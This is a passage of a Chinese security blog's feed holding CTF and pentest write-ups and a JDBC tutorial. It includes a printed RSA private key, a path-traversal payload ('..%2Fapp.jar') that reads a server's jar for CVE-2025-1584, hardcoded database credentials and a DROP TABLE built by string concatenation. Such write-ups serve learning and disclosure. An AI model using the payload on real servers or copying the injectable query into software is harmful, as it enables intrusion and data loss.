class="line">&lt;RSAKeyValue&gt;&lt;Modulus&gt;uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;P&gt;2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==&lt;/P&gt;&lt;Q&gt;2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==&lt;/Q&gt;&lt;DP&gt;ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==&lt;/DP&gt;&lt;DQ&gt;PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==&lt;/DQ&gt;&lt;InverseQ&gt;JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==&lt;/InverseQ&gt;&lt;D&gt;tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=&lt;/D&gt;&lt;/RSAKeyValue&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=</span><br></pre></td></tr></table></figure><p>先把密钥转为pem格式的<a href="https://www.ssleye.com/ssltool/pem_xml.html">https://www.ssleye.com/ssltool/pem_xml.html</a></p><p>使用密钥来解密AESkey</p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-101816629.png" class="">  <p>得到AES key后就可以解密密文了，密文的钱16字节就是iv<br><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-102221035.png" class="">  </p><img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-102211085.png" class="">  <img src="/2025/05/25/%E6%98%A5%E7%A7%8BThermalPower/IMG_20250526-110219092.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;shiro-heapdump&quot;&gt;&lt;a href=&quot;#shiro-heapdump&quot; class=&quot;headerlink&quot; title=&quot;shiro+heapdump&quot;&gt;&lt;/a&gt;shiro+heapdump&lt;/h1&gt;&lt;p&gt;首先先拿fscan扫一下ip&lt;/p&gt;
&lt;im</summary>
      
    
    
    
    
    <category term="渗透" scheme="https://lisien11.xyz/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>palu</title>
    <link href="https://lisien11.xyz/2025/05/20/palu/"/>
    <id>https://lisien11.xyz/2025/05/20/palu/</id>
    <published>2025-05-20T13:31:12.000Z</published>
    <updated>2025-05-20T14:04:29.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ezblog"><a href="#ezblog" class="headerlink" title="ezblog"></a>ezblog</h1><p>首先看源码可以看到</p><img src="/2025/05/20/palu/IMG_20250520-214154139.png" class="">  <p>只要访问blcakdoor输入指定key就可以得到flag</p><p>但是看不了有什么绕过逻辑，所以我看了眼app这个main类发现<br><img src="/2025/05/20/palu/IMG_20250520-214358864.png" class=""><br>指定了某个静态文件夹。这时候我想到会不会有静态目录穿越，所以就试了一下..%2Fapp.jar发现成功读取了<br>读取到app.jar也就知道了key，这题就结束了。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>出于好奇我就看了一些依赖发现这个是solon框架的，而且版本还不低，所以我在网上查了一下，发现在今年有个 CVE-2025-1584,<br>但是没有分析文章，所以就只好看一下代码改了啥自己分析了<br><img src="/2025/05/20/palu/IMG_20250520-215520960.png" class=""><br>我们可以看到其主要更改了solon-projects/solon-web/solon-web-staticfiles/src/main/java/org/noear/solon/web/staticfiles/StaticMappings.java的路径判断<br>检测了../来防止目录穿越。<br>3.08是没有检测的，当路径有../时也可以进入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ezblog&quot;&gt;&lt;a href=&quot;#ezblog&quot; class=&quot;headerlink&quot; title=&quot;ezblog&quot;&gt;&lt;/a&gt;ezblog&lt;/h1&gt;&lt;p&gt;首先看源码可以看到&lt;/p&gt;
&lt;img src=&quot;/2025/05/20/palu/IMG_20250520-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>工具分析ysoSerial</title>
    <link href="https://lisien11.xyz/2025/05/13/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90ysoSerial/"/>
    <id>https://lisien11.xyz/2025/05/13/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90ysoSerial/</id>
    <published>2025-05-13T07:21:00.000Z</published>
    <updated>2025-05-13T07:24:08.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="感觉最近学啥都没什么劲，应该是iscc后遗症。"><a href="#感觉最近学啥都没什么劲，应该是iscc后遗症。" class="headerlink" title="感觉最近学啥都没什么劲，应该是iscc后遗症。"></a>感觉最近学啥都没什么劲，应该是iscc后遗症。</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;感觉最近学啥都没什么劲，应该是iscc后遗症。&quot;&gt;&lt;a href=&quot;#感觉最近学啥都没什么劲，应该是iscc后遗症。&quot; class=&quot;headerlink&quot; title=&quot;感觉最近学啥都没什么劲，应该是iscc后遗症。&quot;&gt;&lt;/a&gt;感觉最近学啥都没什么劲，应该是is</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>java开发</title>
    <link href="https://lisien11.xyz/2025/05/10/java%E5%BC%80%E5%8F%91/"/>
    <id>https://lisien11.xyz/2025/05/10/java%E5%BC%80%E5%8F%91/</id>
    <published>2025-05-10T07:13:47.000Z</published>
    <updated>2025-05-12T06:00:42.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><p>JDBC全称Java DataBase Connectivity。</p><p>JDBC再进行sql查询的步骤如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.注册驱动(如mysql的驱动)</span><br><span class="line">2.进行数据库连接，获取连接对象</span><br><span class="line">3.获取sql语句执行对象</span><br><span class="line">4.执行sql语句</span><br><span class="line">5.释放资源(直接close即可)</span><br></pre></td></tr></table></figure></p><h2 id="注册驱动-如mysql的驱动"><a href="#注册驱动-如mysql的驱动" class="headerlink" title="注册驱动(如mysql的驱动)"></a>注册驱动(如mysql的驱动)</h2><p>注册驱动有两种方法<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DriverManager.registerDriver(new com.mysql.cj.jdbc.Driver());</span><br><span class="line"></span><br><span class="line">Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;)</span><br></pre></td></tr></table></figure><br>一种是直接使用驱动管理器DriverManager的registerDriver的方法来注册驱动，而另一种是直接使用forName来加载com.mysql.cj.jdbc.Driverr这个类。</p><p>可以发现其类的static块调用了DriverManager.registerDriver(new Driver());<br><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250510-161618911.png" class=""><br>所以这两个从本质上其实没区别。</p><h3 id="DriverManager"><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h3><p><code>DriverManager</code> 是 Java JDBC（Java Database Connectivity）API 的核心类之一，它负责<strong>管理数据库驱动</strong>并协调应用程序与数据库之间的连接。以下是其核心作用和工作原理的详细解析：</p><hr><h3 id="一、DriverManager-的核心作用"><a href="#一、DriverManager-的核心作用" class="headerlink" title="一、DriverManager 的核心作用"></a><strong>一、DriverManager 的核心作用</strong></h3><div class="table-container"><table><thead><tr><th><strong>功能</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>驱动注册</strong></td><td>维护一个已注册的 JDBC 驱动列表（如 MySQL、PostgreSQL 等数据库的驱动）</td></tr><tr><td><strong>连接路由</strong></td><td>根据 JDBC URL 的格式（如 <code>jdbc:mysql://...</code>）自动选择匹配的驱动来建立连接</td></tr><tr><td><strong>连接管理</strong></td><td>提供统一的接口（<code>getConnection()</code>）创建数据库连接，隐藏底层驱动差异</td></tr></tbody></table></div><hr><h3 id="二、工作原理"><a href="#二、工作原理" class="headerlink" title="二、工作原理"></a><strong>二、工作原理</strong></h3><h4 id="1-驱动注册机制"><a href="#1-驱动注册机制" class="headerlink" title="1. 驱动注册机制"></a><strong>1. 驱动注册机制</strong></h4><ul><li><p><strong>自动注册（JDBC 4.0+）</strong>：<br>驱动 JAR 包中的 <code>META-INF/services/java.sql.Driver</code> 文件声明驱动类全名，<code>DriverManager</code> 在首次调用时自动加载这些驱动。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例：MySQL 驱动 JAR 中的声明文件</span><br><span class="line">com.mysql.cj.jdbc.Driver</span><br></pre></td></tr></table></figure></li><li><p><strong>手动注册（旧版本兼容）</strong>：<br>通过 <code>Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;)</code> 触发驱动的静态代码块注册。</p></li></ul><h4 id="2-连接建立流程"><a href="#2-连接建立流程" class="headerlink" title="2. 连接建立流程"></a><strong>2. 连接建立流程</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：获取 MySQL 连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">    <span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>, </span><br><span class="line">    <span class="string">&quot;user&quot;</span>, </span><br><span class="line">    <span class="string">&quot;password&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><ol><li><strong>解析 URL</strong>：<code>DriverManager</code> 遍历所有已注册驱动，找到能识别 <code>jdbc:mysql://</code> 前缀的驱动（如 MySQL 驱动）。</li><li><strong>创建连接</strong>：匹配的驱动实例调用 <code>connect()</code> 方法，与数据库建立 TCP 连接并完成认证。</li><li><strong>返回 Connection 对象</strong>：封装数据库连接的 Java 对象，用于后续 SQL 操作。</li></ol><hr><h3 id="三、关键方法"><a href="#三、关键方法" class="headerlink" title="三、关键方法"></a><strong>三、关键方法</strong></h3><div class="table-container"><table><thead><tr><th><strong>方法</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>static Connection getConnection(String url, String user, String password)</code></td><td>根据 URL、用户名、密码获取数据库连接</td></tr><tr><td><code>static void registerDriver(Driver driver)</code></td><td>手动注册驱动（通常不需要直接调用）</td></tr><tr><td><code>static void deregisterDriver(Driver driver)</code></td><td>从注册列表中移除驱动</td></tr><tr><td><code>static Enumeration&lt;Driver&gt; getDrivers()</code></td><td>获取所有已注册的驱动实例</td></tr></tbody></table></div><hr><h2 id="进行数据库连接，获取连接对象"><a href="#进行数据库连接，获取连接对象" class="headerlink" title="进行数据库连接，获取连接对象"></a>进行数据库连接，获取连接对象</h2><p>我们使用DriverManager的getConnection来进行数据库的连接<br>DriverManager.getConnection(String url, String user, String password)<br><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250510-162455934.png" class=""><br>其url的结构为<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc:+数据库类型+://+地址+/+数据库名</span><br><span class="line">如</span><br><span class="line">jdbc:mysql://127.0.0.1:3306/web</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection connection= DriverManager.getConnection(&quot;jdbc:mysql://127.0.0.1:3306/web&quot;,&quot;root&quot;,&quot;root11&quot;);</span><br></pre></td></tr></table></figure><h2 id="获取命令执行对象"><a href="#获取命令执行对象" class="headerlink" title="获取命令执行对象"></a>获取命令执行对象</h2><p>jdbc存在存在三种命令执行对象<br>| ​对象​            | ​核心用途​        | ​安全性​ | ​性能​           |<br>| :———————— | :———————— | :———- | :———————- |<br>| Statement         | 静态 SQL          | 低       | 低（无预编译）   |<br>| PreparedStatement | 动态参数化 SQL    | 高       | 高（支持预编译） |<br>| CallableStatement | 存储过程/函数调用 | 高       | 依赖数据库逻辑   |</p><p>我们常用的是Statement和PreparedStatement，PreparedStatement是支持预编译的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Statement stmt=connection.createStatement();</span><br><span class="line">PreparedStatement preparedStatement=connection.prepareStatement(<span class="string">&quot;insert into user values(?,?,?)&quot;</span>);<span class="comment">//sql预编译</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h2><h3 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h3><p>Statement sql语句的主要操作函数有如下三个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">executeQuery() <span class="comment">//执行select查询语句</span></span><br><span class="line">executrupdate() <span class="comment">//可以执行insert，update，delect，CREATE，之类的</span></span><br><span class="line">execute() <span class="comment">//执行任意语句</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stmt.executeQuery(&quot;Select database()&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><p>PreparedStatement其sql语句是在其获取命令执行对象时就以及写入了预编译语句。其要进行sql执行只要对其参数进行传入即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input=2</span><br><span class="line">PreparedStatement psmt=connection.prepareStatement(&quot;Select * from Users and where id=?&quot;)</span><br><span class="line">psmt.set(1,input)</span><br><span class="line">psmt.executeQuery()</span><br></pre></td></tr></table></figure></p><h2 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码\"></a>整体代码\</h2><h3 id="Statement-1"><a href="#Statement-1" class="headerlink" title="Statement"></a>Statement</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mysql_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CreatTable</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="comment">//注册驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driverr&quot;</span>);</span><br><span class="line">        <span class="comment">//mysql连接获取连接对象</span></span><br><span class="line">        Connection connection= DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        <span class="comment">//获取sql执行对象</span></span><br><span class="line">        Statement statement=connection.createStatement();</span><br><span class="line">        <span class="comment">//命令执行</span></span><br><span class="line">        String sql=<span class="string">&quot;CREATE TABLE IF NOT EXISTS users (\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    id INT PRIMARY KEY AUTO_INCREMENT,        -- 主键，自增\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    username VARCHAR(50) NOT NULL UNIQUE,    -- 唯一且非空\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    email VARCHAR(100) NOT NULL,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    age INT CHECK (age &gt;= 18),               -- 年龄必须 ≥18\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP -- 默认时间\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;);&quot;</span>;</span><br><span class="line">        statement.execute(sql);</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PreparedStatement-1"><a href="#PreparedStatement-1" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ResultSet <span class="title function_">SelectByName</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getconn(<span class="string">&quot;jdbc:mysql://localhost:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">    String sql=<span class="string">&quot;select * from users where username=?&quot;</span>;</span><br><span class="line">    PreparedStatement  pstmt=conn.prepareStatement(sql);</span><br><span class="line">    pstmt.setString(<span class="number">1</span>,name);</span><br><span class="line">    ResultSet rs=pstmt.executeQuery();</span><br><span class="line">    <span class="keyword">return</span> rs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在jdbc查询时返回的是ResultSet这个接口类<br>我们想查看这个查询结果就需要使用，getString，getInt来获取<br><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250510-185213434.png" class=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lse.kaifa;</span><br><span class="line"><span class="keyword">import</span> JDBC.Mysql_Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">        ResultSet res= sql.SelectByName(<span class="string">&quot;LSE&quot;</span>);</span><br><span class="line">        res.next(); </span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> res.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> res.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            System.out.println(name + <span class="string">&quot;\n&quot;</span> + password);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>需要注意的是我们所得到的ResultSet类的实例，其初始的索引是不在第一行的，我们想获取内容需要使用next使得索引内移</p><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mysql_Test.java</span></span><br><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mysql_Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Connection <span class="title function_">getconn</span><span class="params">(String Url,String username,String password)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(Url,username,password);</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CreatTable</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="comment">//注册驱动</span></span><br><span class="line">        <span class="comment">//mysql连接获取连接对象</span></span><br><span class="line">        Connection connection= getconn(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        <span class="comment">//获取sql执行对象</span></span><br><span class="line">        Statement statement=connection.createStatement();</span><br><span class="line">        <span class="comment">//命令执行</span></span><br><span class="line">        String sql=<span class="string">&quot;CREATE TABLE IF NOT EXISTS users (\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    id INT PRIMARY KEY AUTO_INCREMENT,        -- 主键，自增\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    username VARCHAR(50) NOT NULL UNIQUE,    -- 唯一且非空\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    password VARCHAR(100) NOT NULL,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    email VARCHAR(100) NOT NULL,               -- 年龄必须 ≥18\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP -- 默认时间\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;);&quot;</span>;</span><br><span class="line">        statement.execute(sql);</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delectTableName</span><span class="params">(String TableName)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Connection conn=getconn(<span class="string">&quot;jdbc:mysql://localhost:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        String sql=<span class="string">&quot;Drop Table &quot;</span>+TableName;</span><br><span class="line">        PreparedStatement  pstmt=conn.prepareStatement(sql);<span class="comment">//FROM后不能预处理，预处理胡报错</span></span><br><span class="line">        pstmt.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Update</span><span class="params">(String name,String password,String email,<span class="type">int</span> id)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">        Connection conn=getconn(<span class="string">&quot;jdbc:mysql://localhost:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        String sql=<span class="string">&quot;Update users set username=?,password=?,email=? where id=?&quot;</span>;</span><br><span class="line">        PreparedStatement  pstmt=conn.prepareStatement(sql);</span><br><span class="line">        pstmt.setString(<span class="number">1</span>,name);</span><br><span class="line">        pstmt.setString(<span class="number">2</span>,password);</span><br><span class="line">        pstmt.setString(<span class="number">3</span>,email);</span><br><span class="line">        pstmt.setInt(<span class="number">4</span>,id);</span><br><span class="line">        pstmt.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Insert</span><span class="params">(String name,String password,String email)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">        Connection conn=getconn(<span class="string">&quot;jdbc:mysql://localhost:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        String sql=<span class="string">&quot;Insert into users (username,password,email) values(?,?,?)&quot;</span>;</span><br><span class="line">        PreparedStatement  pstmt=conn.prepareStatement(sql);</span><br><span class="line">        pstmt.setString(<span class="number">1</span>,name);</span><br><span class="line">        pstmt.setString(<span class="number">2</span>,password);</span><br><span class="line">        pstmt.setString(<span class="number">3</span>,email);</span><br><span class="line">        pstmt.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ResultSet <span class="title function_">SelectByName</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getconn(<span class="string">&quot;jdbc:mysql://localhost:3306/web&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root11&quot;</span>);</span><br><span class="line">        String sql=<span class="string">&quot;select * from users where username=?&quot;</span>;</span><br><span class="line">        PreparedStatement  pstmt=conn.prepareStatement(sql);</span><br><span class="line">        pstmt.setString(<span class="number">1</span>,name);</span><br><span class="line">        ResultSet rs=pstmt.executeQuery();</span><br><span class="line">        <span class="keyword">return</span> rs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//test.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> lse.kaifa;</span><br><span class="line"><span class="keyword">import</span> JDBC.Mysql_Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span 